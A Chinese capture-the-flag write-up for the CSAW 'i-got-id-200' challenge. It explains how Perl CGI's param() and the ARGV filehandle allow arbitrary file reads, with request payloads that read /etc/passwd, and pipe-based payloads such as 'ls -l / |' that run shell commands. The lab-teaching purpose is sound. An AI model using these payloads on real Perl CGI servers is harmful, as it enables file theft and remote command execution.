# i-got-id-200  WP（Perl语言param函数）

来源：csaw

难度：6



打开环境，是一个简单的网页，有两个功能：

1.![image-20260123132135488](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123132135488.png)

2.![image-20260123132152867](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123132152867.png)

先扫一下目录，没有什么有用信息：

![image-20260123132054393](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123132054393.png)

抓包第一个功能`forms.pl` ，没有什么有用信息

抓包第二个文件上传功能`files.pl` ,发现上传的文件内容在响应中返回了。

查看大佬WP发现，可能用了param()函数

> ### param函数：
>
> **param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的。**
>
> #### ARGV是什么：
>
> 在Perl中：
>
> ```
> while (<>){
> 	print $_;
> }
> ```
>
> 等价于：
>
> ```
> while (<ARGV>){
> 	print $_;
> }
> ```
>
> 如果 @ARGV中有文件名，Perl会自动打开这些文件并逐行读取
>
> 例如：
>
> ```
> Perl test.pl /etc/passwd
> ```
>
> Perl会自动读取 /etc/passwd
>
> #### param和ARGV结合：
>
> 假设后台代码：
>
> ```
> my $file = $q->param('file');
> while (<>) {
>     print $_;
> }
> ```
>
> 攻击者就可以构造多个参数
>
> 传入多个file参数:
>
> ```
> file=/etc/passwd
> file=normal_upload.txt
> ```
>
> Perl的实际行为：
>
> ```
> $q->param('file') ->("/etc/passwd" , "normal_upload.txt")
> ```
>
> 但程序写的是：
>
> ```
> my $file = $q->param('file');只取第一个
> ```



本题中，先上传一个文件尝试：

![image-20260123151142319](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123151142319.png)

发现她返回了文件内容。

在Perl语言中，可以猜测源码中用了param函数。

该函数的作用在前面已经讲过，所以我们利用其性质。

因为param只会读取第一个文件，把其内容当作文件名来读取。

所以抓包上传正常文件的请求，在其基础上添加一个字段，作为第一个文件：

![image-20260123152243657](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123152243657.png)

##### 为什么伪造的文件参数为ARGV？

ARGV在Perl中不是普通字符串，而是一个魔法文件句柄名，当Perl看到ARGV，它不会读字符串ARGV，而是自动去读取@ARGV里指定的文件。

也就是进入了自动参数文件读取模式。



所以在url后面加想读取的文件就可以直接读取：（必须是无等号）

![image-20260123153011367](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123153011367.png)

> #### payload分析：
>
> 在CGI中，什么时候参数会进入@ARGV？
>
> 会进入@ARGV的情况：
>
> ```
> GET /cgi-bin/file.pl?/etc/passwd
> GET /cgi-bin/file.pl?/var/www/html/flag.txt
> ```
>
> 因为：
>
> - 查询字符串中没有`=`
> - CGI认为这是 **参数列表** 而不是表单数据
>
> 于是：
>
> ```
> @ARGV=("/etc/passwd")
> ```
>
> ##### 把题目和ARGV链接起来：
>
> 让`param('file')` 的第一个值变成 `“ARGV”`
>
> 通过URL查询字符串，让 `@ARGV` 里装入你想读入的文件路径
>
> ##### 例如：
>
> ```
> POST /cgi-bin/file.pl?etc/passwd
> ```
>
> 此时在Perl中等价于：
>
> ```
> $file = "ARGV"
> @ARGV = ("/etc/passwd");
> 
> while(<ARGV>){
> 	print $_;
> }
> ```
>
> `/etc/passwd` 被读出并回显

所以我们先尝试回显`file.pl` 中的内容：

![image-20260123154011917](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123154011917.png)

发现后台代码确实是用了param函数

> 也可以直接猜测，flag在/flag目录中，这是常有的出题方式：
>
> ![image-20260123154505040](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123154505040.png)
>
> ![image-20260123154516364](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123154516364.png)

然后我们利用bash来进行读取当前目录下的文件。

```
/bin/bash%20-c%20ls${IFS}/| 
```

%20为空格，可换成+号

看了大佬的解释为

通过管道的方式，执行任意命令，然后将其输出结果用管道传输到读入流中，这样就可以保证获取到flag文件的位置了。这里用到了${IFS}来作命令分割，原理是会将结果变成bash -c "ls/"的等价形式。

也可以用ls来列出当前的目录：

```
ls%20-l%20/%20|
```

![image-20260123154842759](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123154842759.png)

找到flag,直接读取flag。

![image-20260123154925657](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123154925657.png)



### 总结：

perl文件遇到上传可配合ARGV文件使用造成任意文件读取，然后任意文件读取可利用bash执行一定的命令。

该漏洞利用了 CGI 对无键值查询字符串的处理方式，将其放入 `@ARGV`。由于后端代码使用 `param()` 并在标量上下文中取首值为 `ARGV`，再结合 Perl 对 `ARGV` 文件句柄的隐式读取机制，攻击者可通过 URL 控制 `@ARGV`，从而实现任意文件读取。